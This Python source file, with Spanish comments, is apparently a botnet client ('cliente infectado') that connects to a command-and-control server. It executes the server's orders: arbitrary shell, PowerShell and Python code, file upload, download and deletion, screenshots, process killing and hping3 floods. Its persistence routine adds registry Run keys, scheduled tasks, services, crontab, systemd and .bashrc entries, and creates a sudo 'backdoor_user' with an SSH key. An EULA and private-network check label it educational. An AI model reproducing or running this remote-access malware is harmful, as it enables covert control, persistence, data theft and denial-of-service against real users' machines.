import socket
import subprocess
import platform
import os
import ipaddress
import uuid
import requests
import argparse
import re
import sys
import logging
import configparser
import traceback
import time
import hashlib
import json

# Importar los módulos con las funcionalidades
from modules.basic_commands import (
    execute_system_command,
    get_system_info,
    capture_screenshot,
    list_processes,
    kill_process,
    list_network_connections
)
from modules.file_operations import (
    list_directory,
    upload_file,
    download_file,
    delete_file,
    create_directory
)
from modules.advanced_execution import (
    execute_powershell,
    execute_background_payload
)


# Variables globales
ddos_running = False
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
parser = argparse.ArgumentParser(description="Cliente infectado para conectar al C&C.")
parser.add_argument("--host", required=True, help="IP del servidor C&C")
parser.add_argument("--port", type=int, required=True, help="Puerto del servidor C&C")
parser.add_argument("--key", required=True, help="Clave de autenticación")
args = parser.parse_args()

# Configurar logging
def configurar_logging():
    """
    Configura el sistema de logging para el cliente infectado.

    La configuración se lee desde el archivo "config.ini" en la carpeta "config"
    en el directorio raíz del proyecto. Si no se encuentra el archivo, se muestra
    un mensaje de error y se sale del programa.

    La ruta del archivo de log se establece en el directorio "logs" en el
    directorio raíz del proyecto. Si no existe, se crea.

    El nivel de log se establece según la clave "LOG_LEVEL" en el objeto de
    configuración. El nivel de log puede ser "DEBUG", "INFO", "WARNING", "ERROR"
    o "CRITICAL". Si no se especifica un nivel de log, se establece en "INFO"
    por defecto.

    Los mensajes de log se escriben en el archivo de log y en la consola.
    """

    try:
        config_path = os.path.join(BASE_DIR, "config", "config.ini")
        if not os.path.exists(config_path):
            print("[ERROR] No se encontró config.ini en la carpeta config/")
            sys.exit(1)

        config = configparser.ConfigParser()
        config.read(config_path)

        # Ruta absoluta para el directorio de logs en el directorio raíz del proyecto
        log_dir = os.path.join(BASE_DIR, config.get("LOGGING", "LOG_DIR", fallback="logs"))
        log_file = config.get("LOGGING", "CLIENT_LOG_FILE", fallback="client.log")

        # Asegurar que la carpeta logs exista en el directorio raíz del proyecto
        os.makedirs(log_dir, exist_ok=True)

        log_path = os.path.join(log_dir, log_file)

        log_level = config.get("LOGGING", "LOG_LEVEL", fallback="INFO").upper()
        log_levels = {
            "DEBUG": logging.DEBUG,
            "INFO": logging.INFO,
            "WARNING": logging.WARNING,
            "ERROR": logging.ERROR,
            "CRITICAL": logging.CRITICAL
        }

        logging.basicConfig(
            level=log_levels.get(log_level, logging.INFO),
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[
                logging.FileHandler(log_path, encoding="utf-8"),  # Guardar en archivo
                logging.StreamHandler()  # Mostrar en pantalla
            ]
        )

        logging.info(f"Logging configurado correctamente en {log_path}")
    except Exception as e:
        logging.error(f"Error al configurar el logging: {e}")

# Llamar a la función de configuración de logging al inicio del script
configurar_logging()

def validar_ip(ip):
    
    """
    Verifica que una IP sea válida.

    Utiliza una expresión regular para verificar que la IP tenga el formato
    correcto. La expresión regular coincide con direcciones IP en formato
    decimal (por ejemplo, 127.0.0.1).

    Parameters:
    ip (str): La IP a verificar.

    Returns:
    bool: True si la IP es válida, False en caso contrario.
    """
    
    try:
        patron = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")
        return patron.match(ip) is not None
    except Exception as e:
        logging.error(f"Error al validar la IP: {e}")
        return False

def validar_puerto(port):
    
    """
    Verifica que un puerto sea válido.

    Un puerto válido es un número entre 1 y 65535.

    Parameters:
    port (int): El puerto a verificar.

    Returns:
    bool: True si el puerto es válido, False en caso contrario.
    """

    try:
        return 1 <= port <= 65535
    except Exception as e:
        logging.error(f"Error al validar el puerto: {e}")
        return False

def esEntornoCloud():
    """Indica si el programa se ejecuta en un entorno de cloud computing.

    La función intenta conectarse a los puntos de metadata de varios proveedores de cloud
    (AWS, Google Cloud, Azure, DigitalOcean) y devuelve True si alguno de ellos responde.
    Si no se logra conectar a ninguno de ellos, se devuelve False.

    Returns:
        bool: True si se ejecuta en un entorno de cloud, False en caso contrario.
    """
    cloud_metadata_urls = [
        "http://169.254.169.254/latest/meta-data/",  # AWS
        "http://metadata.google.internal/",  # Google Cloud
        "http://169.254.169.254/metadata/v1/",  # DigitalOcean
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01"  # Azure
    ]

    for url in cloud_metadata_urls:
        try:
            if requests.get(url, timeout=1).status_code == 200:
                logging.info(f"Entorno de cloud computing detectado: {url}")
                return True
        except requests.exceptions.RequestException:
            continue
        except Exception as e:
            logging.error(f"Error al detectar el entorno cloud: {e}")

    return False

def es_red_privada(ip):
    """Indica si una IP es de una red privada o no.

    La función intenta crear un objeto ipaddress.ip_address() con la IP dada y devuelve
    el resultado de llamar a su método is_private(). Si la IP no es válida,
    devuelve False.

    Parameters:
    ip (str): La IP a verificar.

    Returns:
    bool: True si la IP es de una red privada, False si no lo es.
    """

    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError as e:
        logging.error(f"Error al verificar si la IP es privada: {e}")
        return False
    
def verificar_eula(tipo):
    """
    Verifica si el usuario ha aceptado la licencia antes de ejecutar el programa.
    
    :param tipo: "servidor" o "cliente" para determinar qué EULA verificar.
    """
    try:
        if tipo not in ["servidor", "cliente"]:
            raise ValueError("Tipo de EULA no válido. Debe ser 'servidor' o 'cliente'.")

        # Ruta para el archivo EULA en la carpeta docs
        BASE_DIR = os.path.dirname(os.path.abspath(__file__))
        eula_path = os.path.join(BASE_DIR, "..", "docs", f"eula_{tipo}.txt")

        # Si no existe, lo crea
        if not os.path.exists(eula_path):
            with open(eula_path, "w") as f:
                f.write("ACCEPTED=False")

        # Leer si ya aceptó
        with open(eula_path, "r") as f:
            for linea in f:
                if "ACCEPTED=True" in linea:
                    return True

        # Mostrar Acuerdo de Licencia
        print("\n" + "="*50)
        print(f"📜  ACUERDO DE LICENCIA ({tipo.upper()}) 📜")
        print("="*50)
        print("\nEste software es exclusivamente para propósitos educativos y de investigación.")
        print("El uso en redes ajenas sin autorización está prohibido.")
        print("El usuario debe cumplir con las leyes de su país.")
        print("No se permite el uso de este software en redes públicas.")
        print("El autor no se hace responsable del uso indebido.\n")
        
        print("🔴  QUEDA TERMINANTEMENTE PROHIBIDO:")
        print("   - Usarlo con intenciones maliciosas.")
        print("   - Ejecutarlo en infraestructuras críticas sin permiso.")
        print("   - Modificarlo para evadir restricciones.")
        print("   - Distribuirlo con fines ilegales o comerciales.\n")
        
        print("💡  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\n")
        
        respuesta = input("Escriba 'ACEPTO' para continuar: ").strip().upper()
        
        if respuesta == "ACEPTO":
            with open(eula_path, "w") as f:
                f.write("ACCEPTED=True")
            return True
        else:
            print("Debe aceptar la licencia para usar este software.")
            exit()
    except Exception as e:
        logging.error(f"Error al verificar el EULA: {e}")
        exit()

def detectar_sistema():
    
    """
    Detecta el sistema operativo del bot.

    Usa la función platform.system() para determinar el sistema operativo
    del bot y devuelve el resultado en minúsculas, ya sea "windows" o "linux".
    """
    try:
        return platform.system().lower()  # "windows" o "linux"
    except Exception as e:
        logging.error(f"Error al detectar el sistema operativo: {e}")
        return "desconocido"

def conectar_a_CnC():
    try:
        bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bot.connect((args.host, args.port))
        logging.info(f"Conectado al servidor C&C {args.host}:{args.port}")
        return bot
    except Exception as e:
        logging.error(f"Error al conectar con el C&C: {traceback.format_exc()}")
        sys.exit(1)

def intentar_persistencia():

    """
    Intenta establecer persistencia en el sistema operativo del bot.

    Dependiendo del sistema operativo detectado, ejecuta una serie de comandos
    que intentan asegurar la persistencia del bot en el sistema. En Windows,
    utiliza métodos como el registro, tareas programadas y servicios. En Linux,
    emplea crontab, systemd y modificaciones en archivos de inicio. Si alguno
    de los métodos tiene éxito, se detiene el proceso y devuelve un mensaje
    indicando el método exitoso. Si todos fallan, devuelve un mensaje de error.

    :return: Un mensaje indicando si se logró la persistencia o un error.
    :rtype: str
    """

    so = detectar_sistema()
    persistencia_exitosa = False
    mensaje_final = "[ERROR] No se pudo establecer persistencia"

    if so == "windows":
        comandos = [
                # 1. Registro de Windows
                'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemUpdater /t REG_SZ /d "%APPDATA%\\clienteinfectado.exe" /f',
                # 2. Tarea Programada
                'schtasks /create /tn "SystemUpdater" /tr "%APPDATA%\\clienteinfectado.exe" /sc ONLOGON /rl HIGHEST',
                # 3. Carpeta de Inicio
                'copy %APPDATA%\\clienteinfectado.exe %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemUpdater.exe',
                # 4. Servicio de Windows
                'sc create SystemUpdater binPath= "%APPDATA%\\clienteinfectado.exe" start= auto',
                # 5. WMI Events (requiere admin)
                'powershell New-ScheduledTaskTrigger -AtLogon | Register-ScheduledTask -TaskName "SystemUpdater" -Action (New-ScheduledTaskAction -Execute "%APPDATA%\\clienteinfectado.exe")'
            ]

    elif so == "linux":
        comandos = [
            # 1. Crontab
            "(crontab -l ; echo '@reboot nohup python3 ~/clienteinfectado.py &') | crontab -",
            # 2. Systemd Service
            """echo '[Unit]
                Description=Bot Persistente
                After=network.target

                [Service]
                ExecStart=/usr/bin/python3 ~/clienteinfectado.py
                Restart=always
                User=$USER

                [Install]
                WantedBy=multi-user.target' | sudo tee /etc/systemd/system/bot.service && sudo systemctl enable bot.service""",
            # 3. Modificación de ~/.bashrc
            "echo 'python3 ~/clienteinfectado.py &' >> ~/.bashrc",
            # 4. Modificación de /etc/profile (requiere root)
            "sudo sh -c 'echo python3 ~/clienteinfectado.py >> /etc/profile'",
            # 5. Crear usuario SSH con clave autorizada
            "sudo useradd -m -s /bin/bash backdoor_user && echo 'backdoor_user:password' | sudo chpasswd && sudo usermod -aG sudo backdoor_user",
            "mkdir -p /home/backdoor_user/.ssh && echo 'ssh-rsa AAAAB3...' > /home/backdoor_user/.ssh/authorized_keys",
            "chmod 600 /home/backdoor_user/.ssh/authorized_keys && chown -R backdoor_user:backdoor_user /home/backdoor_user/.ssh"
        ]

    else:
        return mensaje_final  # Sistema no reconocido

    for cmd in comandos:
        try:
            resultado = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if resultado.returncode == 0:
                persistencia_exitosa = True
                mensaje_final = f"[OK] Persistencia establecida con: {cmd.split()[0]}"
                break  # Detener el intento tras el primer éxito
        except Exception as e:
            logging.error(f"Error al intentar establecer persistencia: {e}")
            continue  # Si un método falla, probar el siguiente

    return mensaje_final

def enviar_respuesta_completa(bot, respuesta):
    """
    Envía una respuesta completa al servidor, manejando respuestas grandes.

    :param bot: El socket del bot conectado.
    :type bot: socket.socket
    :param respuesta: La respuesta a enviar.
    :type respuesta: bytes
    """
    try:
        # Dividir la respuesta en partes si es muy grande
        for i in range(0, len(respuesta), 4096):
            bot.send(respuesta[i:i+4096])
        # Enviar una señal de fin de respuesta
        bot.send(b"<END_OF_RESPONSE>")
    except Exception as e:
        logging.error(f"Error al enviar la respuesta completa: {e}")

def esperar_ordenes(bot):
    """Procesa las órdenes recibidas del servidor."""
    while True:
        try:
            orden = bot.recv(1024).decode('utf-8', errors='ignore').strip()
            if not orden:
                continue
            
            logging.info(f"Comando recibido: {orden}")
            resultado = None

            # Procesamiento de comandos
            try:
                if orden == "shutdown":
                    logging.info("Recibida orden de apagado")
                    bot.close()
                    break

                elif orden == "detect_os":
                    bot.send(detectar_sistema().encode("utf-8"))
                    continue

                elif orden == "sysinfo":
                    resultado = get_system_info()

                elif orden == "screenshot":
                    resultado = capture_screenshot()
                    if resultado['success']:
                        resultado = f"data:image/png;base64,{resultado['image']}"
                    else:
                        resultado = f"Error: {resultado['error']}"

                elif orden.startswith("cmd:"):
                    comando = orden[4:]
                    resultado = execute_system_command(comando)

                elif orden.startswith("file:"):
                    partes = orden[5:].split(":", 2)
                    if len(partes) >= 2:
                        operacion, ruta = partes[0], partes[1]
                        file_data = partes[2] if len(partes) > 2 else None
                        resultado = procesar_operacion_archivo(operacion, ruta, file_data)
                    else:
                        resultado = {"success": False, "error": "Comando de archivo inválido"}

                elif orden.startswith("script:"):
                    partes = orden[7:].split(":", 1)
                    if len(partes) == 2:
                        tipo, contenido = partes
                        resultado = ejecutar_script(tipo, contenido)
                    else:
                        resultado = {"success": False, "error": "Formato de script inválido"}

                elif orden == "procesos":
                    resultado = list_processes()

                elif orden.startswith("kill:"):
                    pid = int(orden[5:])
                    resultado = kill_process(pid)

                elif orden == "netstat":
                    resultado = list_network_connections()

                elif orden == "persistencia":
                    resultado = intentar_persistencia()

                else:
                    resultado = {"success": False, "error": f"Comando no reconocido: {orden}"}

                # Procesar y enviar la respuesta
                if isinstance(resultado, dict):
                    resultado = json.dumps(resultado).encode('utf-8')
                elif isinstance(resultado, str):
                    resultado = resultado.encode('utf-8')
                elif not isinstance(resultado, bytes):
                    resultado = str(resultado).encode('utf-8')

                enviar_respuesta_completa(bot, resultado)

            except Exception as e:
                error_msg = f"Error ejecutando {orden}: {str(e)}"
                logging.error(error_msg)
                enviar_respuesta_completa(bot, error_msg.encode('utf-8'))

        except ConnectionResetError:
            logging.info("El servidor ha cerrado la conexión.")
            break
        except Exception as e:
            logging.error(f"Error en la comunicación con el servidor: {traceback.format_exc()}")
            break

    logging.info("Cliente cerrado correctamente")
    sys.exit(0)

def procesar_operacion_archivo(operacion, ruta, file_data=None):
    """Procesa operaciones con archivos."""
    operaciones = {
        "list": lambda: list_directory(ruta),
        "download": lambda: download_file(ruta),
        "upload": lambda: upload_file(ruta, file_data) if file_data else {"success": False, "error": "No se proporcionaron datos"},
        "delete": lambda: delete_file(ruta),
        "mkdir": lambda: create_directory(ruta)
    }
    
    if operacion in operaciones:
        return operaciones[operacion]()
    return {"success": False, "error": f"Operación no válida: {operacion}"}

def ejecutar_script(tipo, contenido):
    """Ejecuta diferentes tipos de scripts."""
    tipos_script = {
        "powershell": execute_powershell,
        "cmd": lambda x: execute_system_command(x, shell=True),
        "python": lambda x: exec(x),
        "background": lambda x: execute_background_payload(x)
    }
    
    if tipo in tipos_script:
        return tipos_script[tipo](contenido)
    return {"success": False, "error": f"Tipo de script no soportado: {tipo}"}

def ejecutar_comando(orden):
    """
    Ejecuta un comando en el sistema operativo del bot.

    Utiliza subprocess.check_output para ejecutar el comando y captura cualquier
    excepción que ocurra durante la ejecución. Si el comando se ejecuta
    correctamente, devuelve la salida del comando. Si ocurre un error, devuelve
    el mensaje de error.

    :param orden: El comando a ejecutar.
    :type orden: str
    :return: La salida del comando o un mensaje de error.
    :rtype: bytes
    """
    try:
        resultado = subprocess.check_output(orden, shell=True, stderr=subprocess.STDOUT)
        return resultado
    except subprocess.CalledProcessError as e:
        logging.error(f"Error al ejecutar el comando '{orden}': {e.output.decode()}")
        return f"Error: {e.output.decode()}".encode('utf-8')
    except Exception as e:
        logging.error(f"Error inesperado al ejecutar el comando '{orden}': {traceback.format_exc()}")
        return f"Error inesperado: {str(e)}".encode('utf-8')

def simular_ddos(orden):
    """
    Simula un ataque DDoS de manera lenta y sin capacidad de realizar un ataque real.

    :param orden: El comando de DDoS a simular.
    :type orden: str
    :return: Un mensaje indicando que la simulación se ha completado.
    :rtype: str
    """
    try:
        for i in range(10):
            if not ddos_running:
                break
            if "hping3" in orden:
                subprocess.run(orden, shell=True)
            elif "Test-NetConnection" in orden:
                subprocess.run(orden, shell=True)
            time.sleep(5)  # Esperar 5 segundos entre cada intento
        return "[INFO] Simulación de DDoS completada"
    except Exception as e:
        logging.error(f"Error al simular DDoS: {traceback.format_exc()}")
        return "[ERROR] Error al simular DDoS"

def generar_identificador_unico():
    """
    Genera un identificador único para el cliente infectado basado en la información del sistema.

    Utiliza información como el nombre del host, la dirección MAC y el sistema operativo
    para crear un hash SHA-256 que identifica de manera única al cliente.

    :return: Un identificador único en formato hexadecimal.
    :rtype: str
    """
    try:
        hostname = socket.gethostname()
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        sistema_operativo = platform.system().lower()
        info_unica = f"{hostname}-{mac}-{sistema_operativo}"
        identificador = hashlib.sha256(info_unica.encode()).hexdigest()
        logging.info(f"Identificador único generado: {identificador}")
        return identificador
    except Exception as e:
        logging.error(f"Error al generar el identificador único: {e}")
        return None

def ejecutar_bot():
    
    """
    Función principal que conecta el bot al servidor C&C y espera órdenes.

    Establece la conexión con el servidor de Comando y Control (C&C) usando
    la función conectar_a_CnC y luego entra en un bucle para recibir y
    procesar órdenes mediante la función esperar_ordenes.

    :return: None
    """

    try:
        bot = conectar_a_CnC() # Conectar al servidor C&C
        identificador_unico = generar_identificador_unico()
        if identificador_unico:
            bot.send(identificador_unico.encode("utf-8"))
        esperar_ordenes(bot) # Esperar y procesar órdenes
    except Exception as e:
        logging.error(f"Error al ejecutar el bot: {e}")

if __name__ == "__main__":
    try:
        if not validar_ip(args.host):
            logging.error("[ERROR] IP no válida.")
            sys.exit(1)
            
        if not validar_puerto(args.port):
            logging.error("[ERROR] Puerto fuera de rango (1-65535).")
            sys.exit(1)
            
        verificar_eula("cliente")
        HOST = args.host
        PORT = args.port  # Usar el puerto CnC (5001)

        logging.info(f"Conectando a {HOST}:{PORT} con autenticación segura...")

        if esEntornoCloud():
            logging.error("[ERROR] No puedes ejecutar este programa en un servidor cloud.")
            sys.exit(1)
        if not es_red_privada(HOST):
            logging.error("[ERROR] No puedes ejecutar este servidor fuera de una red privada.")
            sys.exit(1)

        SECRET_KEY = args.key
        ejecutar_bot()
    except Exception as e:
        logging.error(f"Error en la ejecución principal: {e}")